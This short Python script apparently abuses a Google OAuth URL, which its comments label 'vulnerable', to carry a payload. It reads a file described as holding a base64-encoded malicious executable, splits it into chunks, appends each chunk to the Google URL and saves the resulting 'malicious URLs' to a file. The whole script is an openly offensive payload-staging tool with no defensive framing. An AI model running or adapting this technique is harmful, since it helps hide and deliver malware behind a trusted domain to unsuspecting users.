import requests
import time

google_Vulnerable = "https://accounts.google.com/o/oauth2/v2/auth/identifier?response_type=" #URL vulnerable


with open('MyFile.txt','r') as file:
    countriesStr = file.read()   #read file with malicious base64 exe file example

n = 3000 #6000 total lenght of string that google accepts
# Using list comprehension

out = [(countriesStr[i:i+n]) for i in range(0, len(countriesStr), n)] # here we create a list with splited encoded string
tam = len(out)
x=0
f= open("ResultOfMaliciousURLs.txt","w+") #create a new file to save the NEW URLS encoded by accounts.google 
for x in range(len(out)):
	time.sleep(0.3)
	requestt = requests.get(google_Vulnerable+out[x])   # Make the requests and save the new URL into the file
	print(out[x] + "\n")
	f.writelines(str("\n"+requestt.url))

print(len(out))
f.close()
file.close()
